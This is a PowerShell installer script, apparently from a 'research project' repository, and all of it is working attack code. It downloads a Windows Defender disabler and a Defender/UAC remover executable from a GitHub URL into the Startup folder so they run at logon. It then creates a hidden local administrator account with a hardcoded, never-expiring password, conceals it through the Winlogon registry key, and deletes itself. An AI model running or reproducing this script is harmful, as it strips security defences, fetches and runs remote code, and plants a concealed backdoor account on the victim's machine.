# Make a directory with random name under temp directory for obfuscation
function New-RandomTempDirectory {
    param(
        [int]$Length = 16
    )

    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    $randomName = -join (1..$Length | ForEach-Object {
        $chars[(Get-Random -Maximum $chars.Length)]
    })

    $tempPath = [System.IO.Path]::GetTempPath()
    $fullPath = Join-Path $tempPath $randomName

    New-Item -ItemType Directory -Path $fullPath -Force | Out-Null

    return $fullPath
}


# $dirPath = New-RandomTempDirectory
# Write-Host "Created directory: $dirPath"

# Download windows disabler
$startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
$url = "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/disableWinDef.ps1"
$outFile = Join-Path $startupPath "disableWinDef.ps1"
Invoke-WebRequest -Uri $url -OutFile $outFile

# Download windows defender and uac remover
$startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
$url = "https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/defender_remover13.exe"
$outFile = Join-Path $startupPath "defender_remover.exe"
Invoke-WebRequest -Uri $url -OutFile $outFile

# Create Admin account for persistence
# Run PowerShell as Administrator
$username = "Adm1nistrator"
$password = "Pa$$w0rd"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force

# Create local user
New-LocalUser `
    -Name $username `
    -Password $securePassword `
    -FullName $username `
    -Description "Local admin account" `
    -PasswordNeverExpires `
    -AccountNeverExpires

# Add user to Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $username

# Hide user from login screen
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"

# Create registry path if it does not exist
if (-not (Test-Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}

# Set user to hidden (0 = hidden, 1 = visible)
New-ItemProperty `
    -Path $regPath `
    -Name $username `
    -PropertyType DWORD `
    -Value 0 `
    -Force | Out-Null

Remove-Item installer.ps1